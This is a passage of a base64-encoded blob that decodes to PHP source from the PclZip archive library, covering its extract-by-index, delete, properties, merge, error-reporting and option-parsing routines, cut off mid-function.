0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSF07DQogICAgICB9DQogICAgICBpZiAoaXNzZXQoJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX0FERF9QQVRIXSkpIHsNCiAgICAgICAgaWYgKChzdHJsZW4oJHZfcGF0aCkgPiAwKSAmJiAoc3Vic3RyKCR2X3BhdGgsIC0xKSAhPSAnLycpKSB7DQogICAgICAgICAgJHZfcGF0aCAuPSAnLyc7DQogICAgICAgIH0NCiAgICAgICAgJHZfcGF0aCAuPSAkdl9vcHRpb25zW1BDTFpJUF9PUFRfQUREX1BBVEhdOw0KICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2Ugew0KDQogICAgICAkdl9wYXRoID0gJHZfYXJnX2xpc3RbMF07DQoNCiAgICAgIGlmICgkdl9zaXplID09IDIpIHsNCiAgICAgICAgJHZfcmVtb3ZlX3BhdGggPSAkdl9hcmdfbGlzdFsxXTsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKCR2X3NpemUgPiAyKSB7DQogICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIG51bWJlciAvIHR5cGUgb2YgYXJndW1lbnRzIik7DQoNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgJHRoaXMtPnByaXZPcHRpb25EZWZhdWx0VGhyZXNob2xkKCR2X29wdGlvbnMpOw0KDQoNCiAgJHBfbGlzdCA9IGFycmF5KCk7DQogICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RXh0cmFjdEJ5UnVsZSgkcF9saXN0LCAkdl9wYXRoLCAkdl9yZW1vdmVfcGF0aCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdl9yZW1vdmVfYWxsX3BhdGgsICR2X29wdGlvbnMpOw0KICBpZiAoJHZfcmVzdWx0IDwgMSkgew0KICAgIHVuc2V0KCRwX2xpc3QpOw0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogIHJldHVybiAkcF9saXN0Ow0KfQ0KDQoNCg0KZnVuY3Rpb24gZXh0cmFjdEJ5SW5kZXgoJHBfaW5kZXgpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICghJHRoaXMtPnByaXZDaGVja0Zvcm1hdCgpKSB7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgJHZfb3B0aW9ucyA9IGFycmF5KCk7DQogICR2X3BhdGggPSAnJzsNCiAgJHZfcmVtb3ZlX3BhdGggPSAiIjsNCiAgJHZfcmVtb3ZlX2FsbF9wYXRoID0gZmFsc2U7DQoNCiAgJHZfc2l6ZSA9IGZ1bmNfbnVtX2FyZ3MoKTsNCg0KICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkddID0gRkFMU0U7DQoNCiAgaWYgKCR2X3NpemUgPiAxKSB7DQogICAgJHZfYXJnX2xpc3QgPSBmdW5jX2dldF9hcmdzKCk7DQoNCiAgICBhcnJheV9zaGlmdCgkdl9hcmdfbGlzdCk7DQogICAgJHZfc2l6ZS0tOw0KDQogICAgaWYgKChpc19pbnRlZ2VyKCR2X2FyZ19saXN0WzBdKSkgJiYgKCR2X2FyZ19saXN0WzBdID4gNzcwMDApKSB7DQoNCiAgICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UGFyc2VPcHRpb25zKCR2X2FyZ19saXN0LCAkdl9zaXplLCAkdl9vcHRpb25zLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkgKFBDTFpJUF9PUFRfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfUkVNT1ZFX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkcgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0FERF9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BSRV9FWFRSQUNUID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BPU1RfRVhUUkFDVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfU0VUX0NITU9EID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9SRVBMQUNFX05FV0VSID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsUENMWklQX09QVF9TVE9QX09OX0VSUk9SID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsUENMWklQX09QVF9FWFRSQUNUX0RJUl9SRVNUUklDVElPTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09OID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGID0+ICdvcHRpb25hbCcNCgkJCQkJCQkJCQkJICAgKSk7DQogICAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQoNCiAgICAgIGlmIChpc3NldCgkdl9vcHRpb25zW1BDTFpJUF9PUFRfUEFUSF0pKSB7DQogICAgICAgICR2X3BhdGggPSAkdl9vcHRpb25zW1BDTFpJUF9PUFRfUEFUSF07DQogICAgICB9DQogICAgICBpZiAoaXNzZXQoJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIXSkpIHsNCiAgICAgICAgJHZfcmVtb3ZlX3BhdGggPSAkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEhdOw0KICAgICAgfQ0KICAgICAgaWYgKGlzc2V0KCR2X29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEhdKSkgew0KICAgICAgICAkdl9yZW1vdmVfYWxsX3BhdGggPSAkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXTsNCiAgICAgIH0NCiAgICAgIGlmIChpc3NldCgkdl9vcHRpb25zW1BDTFpJUF9PUFRfQUREX1BBVEhdKSkgew0KICAgICAgICBpZiAoKHN0cmxlbigkdl9wYXRoKSA+IDApICYmIChzdWJzdHIoJHZfcGF0aCwgLTEpICE9ICcvJykpIHsNCiAgICAgICAgICAkdl9wYXRoIC49ICcvJzsNCiAgICAgICAgfQ0KICAgICAgICAkdl9wYXRoIC49ICR2X29wdGlvbnNbUENMWklQX09QVF9BRERfUEFUSF07DQogICAgICB9DQogICAgICBpZiAoIWlzc2V0KCR2X29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklOR10pKSB7DQogICAgICAgICR2X29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklOR10gPSBGQUxTRTsNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2Ugew0KDQogICAgICAkdl9wYXRoID0gJHZfYXJnX2xpc3RbMF07DQoNCiAgICAgIGlmICgkdl9zaXplID09IDIpIHsNCiAgICAgICAgJHZfcmVtb3ZlX3BhdGggPSAkdl9hcmdfbGlzdFsxXTsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKCR2X3NpemUgPiAyKSB7DQogICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIG51bWJlciAvIHR5cGUgb2YgYXJndW1lbnRzIik7DQoNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KICB9DQoNCg0KICAkdl9hcmdfdHJpY2sgPSBhcnJheSAoUENMWklQX09QVF9CWV9JTkRFWCwgJHBfaW5kZXgpOw0KICAkdl9vcHRpb25zX3RyaWNrID0gYXJyYXkoKTsNCiAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZQYXJzZU9wdGlvbnMoJHZfYXJnX3RyaWNrLCBzaXplb2YoJHZfYXJnX3RyaWNrKSwgJHZfb3B0aW9uc190cmljaywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkgKFBDTFpJUF9PUFRfQllfSU5ERVggPT4gJ29wdGlvbmFsJyApKTsNCiAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICByZXR1cm4gMDsNCiAgfQ0KICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdID0gJHZfb3B0aW9uc190cmlja1tQQ0xaSVBfT1BUX0JZX0lOREVYXTsNCg0KICAkdGhpcy0+cHJpdk9wdGlvbkRlZmF1bHRUaHJlc2hvbGQoJHZfb3B0aW9ucyk7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkV4dHJhY3RCeVJ1bGUoJHBfbGlzdCwgJHZfcGF0aCwgJHZfcmVtb3ZlX3BhdGgsICR2X3JlbW92ZV9hbGxfcGF0aCwgJHZfb3B0aW9ucykpIDwgMSkgew0KICAgICAgcmV0dXJuKDApOw0KICB9DQoNCiAgcmV0dXJuICRwX2xpc3Q7DQp9DQoNCmZ1bmN0aW9uIGRlbGV0ZSgpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICghJHRoaXMtPnByaXZDaGVja0Zvcm1hdCgpKSB7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgJHZfb3B0aW9ucyA9IGFycmF5KCk7DQoNCiAgJHZfc2l6ZSA9IGZ1bmNfbnVtX2FyZ3MoKTsNCg0KICBpZiAoJHZfc2l6ZSA+IDApIHsNCiAgICAkdl9hcmdfbGlzdCA9IGZ1bmNfZ2V0X2FyZ3MoKTsNCg0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UGFyc2VPcHRpb25zKCR2X2FyZ19saXN0LCAkdl9zaXplLCAkdl9vcHRpb25zLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcnJheSAoUENMWklQX09QVF9CWV9OQU1FID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0JZX0VSRUcgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQllfUFJFRyA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9JTkRFWCA9PiAnb3B0aW9uYWwnICkpOw0KICAgIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgICAgICByZXR1cm4gMDsNCiAgICB9DQogIH0NCg0KICAkdGhpcy0+cHJpdkRpc2FibGVNYWdpY1F1b3RlcygpOw0KDQogICR2X2xpc3QgPSBhcnJheSgpOw0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RGVsZXRlQnlSdWxlKCR2X2xpc3QsICR2X29wdGlvbnMpKSAhPSAxKSB7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgdW5zZXQoJHZfbGlzdCk7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgcmV0dXJuICR2X2xpc3Q7DQp9DQoNCmZ1bmN0aW9uIGRlbGV0ZUJ5SW5kZXgoJHBfaW5kZXgpDQp7DQogIA0KICAkcF9saXN0ID0gJHRoaXMtPmRlbGV0ZShQQ0xaSVBfT1BUX0JZX0lOREVYLCAkcF9pbmRleCk7DQoNCiAgcmV0dXJuICRwX2xpc3Q7DQp9DQoNCmZ1bmN0aW9uIHByb3BlcnRpZXMoKQ0Kew0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogICR0aGlzLT5wcml2RGlzYWJsZU1hZ2ljUXVvdGVzKCk7DQoNCiAgaWYgKCEkdGhpcy0+cHJpdkNoZWNrRm9ybWF0KCkpIHsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICByZXR1cm4oMCk7DQogIH0NCg0KICAkdl9wcm9wID0gYXJyYXkoKTsNCiAgJHZfcHJvcFsnY29tbWVudCddID0gJyc7DQogICR2X3Byb3BbJ25iJ10gPSAwOw0KICAkdl9wcm9wWydzdGF0dXMnXSA9ICdub3RfZXhpc3QnOw0KDQogIGlmIChAaXNfZmlsZSgkdGhpcy0+emlwbmFtZSkpDQogIHsNCiAgICBpZiAoKCR0aGlzLT56aXBfZmQgPSBAZm9wZW4oJHRoaXMtPnppcG5hbWUsICdyYicpKSA9PSAwKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgICAgDQogICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAnVW5hYmxlIHRvIG9wZW4gYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnIGluIGJpbmFyeSByZWFkIG1vZGUnKTsNCg0KICAgICAgcmV0dXJuIDA7DQogICAgfQ0KDQogICAgJHZfY2VudHJhbF9kaXIgPSBhcnJheSgpOw0KICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRW5kQ2VudHJhbERpcigkdl9jZW50cmFsX2RpcikpICE9IDEpDQogICAgew0KICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgICByZXR1cm4gMDsNCiAgICB9DQoNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICAgICR2X3Byb3BbJ2NvbW1lbnQnXSA9ICR2X2NlbnRyYWxfZGlyWydjb21tZW50J107DQogICAgJHZfcHJvcFsnbmInXSA9ICR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ107DQogICAgJHZfcHJvcFsnc3RhdHVzJ10gPSAnb2snOw0KICB9DQoNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgcmV0dXJuICR2X3Byb3A7DQp9DQoNCmZ1bmN0aW9uIGR1cGxpY2F0ZSgkcF9hcmNoaXZlKQ0Kew0KICAkdl9yZXN1bHQgPSAxOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICgoaXNfb2JqZWN0KCRwX2FyY2hpdmUpKSAmJiAoZ2V0X2NsYXNzKCRwX2FyY2hpdmUpID09ICdwY2x6aXAnKSkNCiAgew0KDQogICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZEdXBsaWNhdGUoJHBfYXJjaGl2ZS0+emlwbmFtZSk7DQogIH0NCg0KICBlbHNlIGlmIChpc19zdHJpbmcoJHBfYXJjaGl2ZSkpDQogIHsNCg0KICAgIGlmICghaXNfZmlsZSgkcF9hcmNoaXZlKSkgew0KICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX0ZJTEUsICJObyBmaWxlIHdpdGggZmlsZW5hbWUgJyIuJHBfYXJjaGl2ZS4iJyIpOw0KICAgICAgJHZfcmVzdWx0ID0gUENMWklQX0VSUl9NSVNTSU5HX0ZJTEU7DQogICAgfQ0KICAgIGVsc2Ugew0KICAgICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZEdXBsaWNhdGUoJHBfYXJjaGl2ZSk7DQogICAgfQ0KICB9DQoNCiAgZWxzZQ0KICB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIkludmFsaWQgdmFyaWFibGUgdHlwZSBwX2FyY2hpdmVfdG9fYWRkIik7DQogICAgJHZfcmVzdWx0ID0gUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUjsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIG1lcmdlKCRwX2FyY2hpdmVfdG9fYWRkKQ0Kew0KICAkdl9yZXN1bHQgPSAxOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICghJHRoaXMtPnByaXZDaGVja0Zvcm1hdCgpKSB7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgaWYgKChpc19vYmplY3QoJHBfYXJjaGl2ZV90b19hZGQpKSAmJiAoZ2V0X2NsYXNzKCRwX2FyY2hpdmVfdG9fYWRkKSA9PSAncGNsemlwJykpDQogIHsNCg0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2TWVyZ2UoJHBfYXJjaGl2ZV90b19hZGQpOw0KICB9DQoNCiAgZWxzZSBpZiAoaXNfc3RyaW5nKCRwX2FyY2hpdmVfdG9fYWRkKSkNCiAgew0KDQogICAgJHZfb2JqZWN0X2FyY2hpdmUgPSBuZXcgUGNsWmlwKCRwX2FyY2hpdmVfdG9fYWRkKTsNCg0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2TWVyZ2UoJHZfb2JqZWN0X2FyY2hpdmUpOw0KICB9DQoNCiAgZWxzZQ0KICB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIkludmFsaWQgdmFyaWFibGUgdHlwZSBwX2FyY2hpdmVfdG9fYWRkIik7DQogICAgJHZfcmVzdWx0ID0gUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUjsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCg0KDQpmdW5jdGlvbiBlcnJvckNvZGUoKQ0Kew0KICBpZiAoUENMWklQX0VSUk9SX0VYVEVSTkFMID09IDEpIHsNCiAgICByZXR1cm4oUGNsRXJyb3JDb2RlKCkpOw0KICB9DQogIGVsc2Ugew0KICAgIHJldHVybigkdGhpcy0+ZXJyb3JfY29kZSk7DQogIH0NCn0NCg0KZnVuY3Rpb24gZXJyb3JOYW1lKCRwX3dpdGhfY29kZT1mYWxzZSkNCnsNCiAgJHZfbmFtZSA9IGFycmF5ICggUENMWklQX0VSUl9OT19FUlJPUiA9PiAnUENMWklQX0VSUl9OT19FUlJPUicsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfV1JJVEVfT1BFTl9GQUlMID0+ICdQQ0xaSVBfRVJSX1dSSVRFX09QRU5fRkFJTCcsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwgPT4gJ1BDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSID0+ICdQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9NSVNTSU5HX0ZJTEUgPT4gJ1BDTFpJUF9FUlJfTUlTU0lOR19GSUxFJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9GSUxFTkFNRV9UT09fTE9ORyA9PiAnUENMWklQX0VSUl9GSUxFTkFNRV9UT09fTE9ORycsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfSU5WQUxJRF9aSVAgPT4gJ1BDTFpJUF9FUlJfSU5WQUxJRF9aSVAnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0JBRF9FWFRSQUNURURfRklMRSA9PiAnUENMWklQX0VSUl9CQURfRVhUUkFDVEVEX0ZJTEUnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0RJUl9DUkVBVEVfRkFJTCA9PiAnUENMWklQX0VSUl9ESVJfQ1JFQVRFX0ZBSUwnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX0JBRF9FWFRFTlNJT04gPT4gJ1BDTFpJUF9FUlJfQkFEX0VYVEVOU0lPTicsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfQkFEX0ZPUk1BVCA9PiAnUENMWklQX0VSUl9CQURfRk9STUFUJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9ERUxFVEVfRklMRV9GQUlMID0+ICdQQ0xaSVBfRVJSX0RFTEVURV9GSUxFX0ZBSUwnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX1JFTkFNRV9GSUxFX0ZBSUwgPT4gJ1BDTFpJUF9FUlJfUkVOQU1FX0ZJTEVfRkFJTCcsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfQkFEX0NIRUNLU1VNID0+ICdQQ0xaSVBfRVJSX0JBRF9DSEVDS1NVTScsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCA9PiAnUENMWklQX0VSUl9JTlZBTElEX0FSQ0hJVkVfWklQJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSA9PiAnUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRScsDQogICAgICAgICAgICAgICAgICAgIFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUgPT4gJ1BDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUnLA0KICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0NPTVBSRVNTSU9OID0+ICdQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0NPTVBSRVNTSU9OJywNCiAgICAgICAgICAgICAgICAgICAgUENMWklQX0VSUl9VTlNVUFBPUlRFRF9FTkNSWVBUSU9OID0+ICdQQ0xaSVBfRVJSX1VOU1VQUE9SVEVEX0VOQ1JZUFRJT04nDQogICAgICAgICAgICAgICAgICAgICxQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFID0+ICdQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFJw0KICAgICAgICAgICAgICAgICAgICAsUENMWklQX0VSUl9ESVJFQ1RPUllfUkVTVFJJQ1RJT04gPT4gJ1BDTFpJUF9FUlJfRElSRUNUT1JZX1JFU1RSSUNUSU9OJw0KICAgICAgICAgICAgICAgICAgKTsNCg0KICBpZiAoaXNzZXQoJHZfbmFtZVskdGhpcy0+ZXJyb3JfY29kZV0pKSB7DQogICAgJHZfdmFsdWUgPSAkdl9uYW1lWyR0aGlzLT5lcnJvcl9jb2RlXTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkdl92YWx1ZSA9ICdOb05hbWUnOw0KICB9DQoNCiAgaWYgKCRwX3dpdGhfY29kZSkgew0KICAgIHJldHVybigkdl92YWx1ZS4nICgnLiR0aGlzLT5lcnJvcl9jb2RlLicpJyk7DQogIH0NCiAgZWxzZSB7DQogICAgcmV0dXJuKCR2X3ZhbHVlKTsNCiAgfQ0KfQ0KDQpmdW5jdGlvbiBlcnJvckluZm8oJHBfZnVsbD1mYWxzZSkNCnsNCiAgaWYgKFBDTFpJUF9FUlJPUl9FWFRFUk5BTCA9PSAxKSB7DQogICAgcmV0dXJuKFBjbEVycm9yU3RyaW5nKCkpOw0KICB9DQogIGVsc2Ugew0KICAgIGlmICgkcF9mdWxsKSB7DQogICAgICByZXR1cm4oJHRoaXMtPmVycm9yTmFtZSh0cnVlKS4iIDogIi4kdGhpcy0+ZXJyb3Jfc3RyaW5nKTsNCiAgICB9DQogICAgZWxzZSB7DQogICAgICByZXR1cm4oJHRoaXMtPmVycm9yX3N0cmluZy4iIFtjb2RlICIuJHRoaXMtPmVycm9yX2NvZGUuIl0iKTsNCiAgICB9DQogIH0NCn0NCg0KDQoNCg0KDQpmdW5jdGlvbiBwcml2Q2hlY2tGb3JtYXQoJHBfbGV2ZWw9MCkNCnsNCiAgJHZfcmVzdWx0ID0gdHJ1ZTsNCg0KICBjbGVhcnN0YXRjYWNoZSgpOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICghaXNfZmlsZSgkdGhpcy0+emlwbmFtZSkpIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfRklMRSwgIk1pc3NpbmcgYXJjaGl2ZSBmaWxlICciLiR0aGlzLT56aXBuYW1lLiInIik7DQogICAgcmV0dXJuKGZhbHNlKTsNCiAgfQ0KDQogIGlmICghaXNfcmVhZGFibGUoJHRoaXMtPnppcG5hbWUpKSB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgIlVuYWJsZSB0byByZWFkIGFyY2hpdmUgJyIuJHRoaXMtPnppcG5hbWUuIiciKTsNCiAgICByZXR1cm4oZmFsc2UpOw0KICB9DQoNCg0KDQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdlBhcnNlT3B0aW9ucygmJHBfb3B0aW9uc19saXN0LCAkcF9zaXplLCAmJHZfcmVzdWx0X2xpc3QsICR2X3JlcXVlc3RlZF9vcHRpb25zPWZhbHNlKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCiAgDQogICRpPTA7DQogIHdoaWxlICgkaTwkcF9zaXplKSB7DQoNCiAgICBpZiAoIWlzc2V0KCR2X3JlcXVlc3RlZF9vcHRpb25zWyRwX29wdGlvbnNfbGlzdFskaV1dKSkgew0KICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX1BBUkFNRVRFUiwgIkludmFsaWQgb3B0aW9uYWwgcGFyYW1ldGVyICciLiRwX29wdGlvbnNfbGlzdFskaV0uIicgZm9yIHRoaXMgbWV0aG9kIik7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgIHN3aXRjaCAoJHBfb3B0aW9uc19saXN0WyRpXSkgew0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1BBVEggOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9BRERfUEFUSCA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gUGNsWmlwVXRpbFRyYW5zbGF0ZVdpblBhdGgoJHBfb3B0aW9uc19saXN0WyRpKzFdLCBGQUxTRSk7DQogICAgICAgICRpKys7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTEQgOg0KICAgICAgICBpZiAoKCRpKzEpID49ICRwX3NpemUpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX01JU1NJTkdfT1BUSU9OX1ZBTFVFLCAiTWlzc2luZyBwYXJhbWV0ZXIgdmFsdWUgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KICAgICAgICAgIHJldHVyb